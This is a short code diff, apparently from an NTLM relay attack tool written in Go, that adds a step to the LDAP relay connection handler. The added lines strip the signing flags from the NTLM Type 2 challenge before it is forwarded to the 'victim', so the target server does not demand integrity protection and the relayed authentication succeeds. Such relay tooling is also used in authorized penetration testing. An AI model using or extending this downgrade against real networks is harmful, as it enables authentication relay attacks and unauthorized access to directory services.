@@ -271,6 +271,9 @@ func handleLDAPRelayConn(ctx context.Context, conn net.Conn, ops ldapRelayOps, m
 		return
 	}
 
+	// Strip signing flags so the server won't require integrity protection
+	type2Bytes = relayStripType2Signing(type2Bytes)
+
 	// Step 3: Forward Type 2 to victim
 	type2B64 := base64.StdEncoding.EncodeToString(type2Bytes)
 	sendHTTP401NTLM(conn, type2B64)
